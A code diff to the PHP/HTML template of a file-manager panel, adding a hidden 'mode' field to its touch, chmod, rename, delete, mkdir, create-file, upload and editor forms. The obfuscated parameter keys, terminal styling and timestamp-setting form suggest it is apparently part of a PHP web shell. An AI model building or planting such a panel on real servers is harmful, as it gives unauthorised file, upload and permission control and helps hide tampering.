@@ -120,6 +120,7 @@
                           data-mtime="<?= $item['mtime'] !== 'N/A' ? h($item['mtime']) : date('Y-m-d H:i:s') ?>"
                           onsubmit="return promptTouch(this);">
                         <input type="hidden" name="<?= h($_sk['fo']) ?>" value="touch">
+                        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                         <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                         <input type="hidden" name="<?= h($_sk['tt']) ?>" value="<?= h($item['name']) ?>">
                         <input type="hidden" name="<?= h($_sk['tw']) ?>" class="touch_input" value="">
@@ -132,6 +133,7 @@
                           data-perms="<?= h($item['perms']) ?>"
                           onsubmit="return promptChmod(this);">
                         <input type="hidden" name="<?= h($_sk['fo']) ?>" value="chmod">
+                        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                         <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                         <input type="hidden" name="<?= h($_sk['ct']) ?>" value="<?= h($item['name']) ?>">
                         <input type="hidden" name="<?= h($_sk['cv']) ?>" class="chmod_input" value="<?= h($item['perms']) ?>">
@@ -143,6 +145,7 @@
                           data-name="<?= h($item['name']) ?>"
                           onsubmit="return promptRename(this);">
                         <input type="hidden" name="<?= h($_sk['fo']) ?>" value="rename">
+                        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                         <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                         <input type="hidden" name="<?= h($_sk['on']) ?>" value="<?= h($item['name']) ?>">
                         <input type="hidden" name="<?= h($_sk['nn']) ?>" class="rename_input" value="">
@@ -152,6 +155,7 @@
                     <!-- Delete -->
                     <form method="post" style="display:inline;" data-name="<?= h($item['name']) ?>">
                         <input type="hidden" name="<?= h($_sk['fo']) ?>" value="rm">
+                        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                         <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                         <input type="hidden" name="<?= h($_sk['ti']) ?>" value="<?= h($item['name']) ?>">
                         <button type="submit" class="btn-sm btn-danger"
@@ -173,6 +177,7 @@
         <!-- Create Directory -->
         <form method="post" style="background:#000; padding:10px; border:1px solid var(--line);">
             <input type="hidden" name="<?= h($_sk['fo']) ?>" value="mkdir">
+            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
             <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
             <strong style="display:block; margin-bottom:6px; color:var(--accent);">&gt; CREATE DIRECTORY:</strong>
             <div style="display:flex; gap:6px;">
@@ -184,6 +189,7 @@
         <!-- Create File -->
         <form method="post" style="background:#000; padding:10px; border:1px solid var(--line);">
             <input type="hidden" name="<?= h($_sk['fo']) ?>" value="mkfile">
+            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
             <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
             <strong style="display:block; margin-bottom:6px; color:var(--text);">&gt; CREATE FILE:</strong>
             <div style="display:flex; flex-direction:column; gap:6px;">
@@ -196,6 +202,7 @@
         <!-- Upload File -->
         <form method="post" enctype="multipart/form-data" style="background:#000; padding:10px; border:1px solid var(--line);">
             <input type="hidden" name="<?= h($_sk['fo']) ?>" value="upload">
+            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
             <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
             <strong style="display:block; margin-bottom:6px; color:var(--good);">&gt; UPLOAD FILE:</strong>
             <div style="display:flex; gap:6px;">
@@ -226,8 +233,10 @@
     </div>
     <form method="post" id="form-editor">
         <input type="hidden" name="<?= h($_sk['fo']) ?>" value="edit_save">
+        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
         <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
         <input type="hidden" name="<?= h($_sk['ef']) ?>" value="<?= h($ed['filename']) ?>">
+        <input type="hidden" name="<?= h($_sk['vw']) ?>" value="<?= h($ed['filename']) ?>">
         <textarea name="<?= h($_sk['fc']) ?>" style="height:420px;"><?= h($ed['content']) ?></textarea>
         <div style="margin-top:10px; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
             <button type="submit" class="btn-good" style="padding:8px 16px;">
